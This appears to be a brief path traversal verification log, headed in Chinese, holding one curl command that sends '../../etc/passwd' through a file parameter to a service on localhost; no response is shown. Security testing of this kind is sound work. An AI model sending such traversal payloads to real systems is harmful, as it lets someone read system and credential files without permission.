# Path Traversal 漏洞验证日志

## 测试命令与响应
$ curl -s 'http://localhost:22046/read?file=../../etc/passwd'
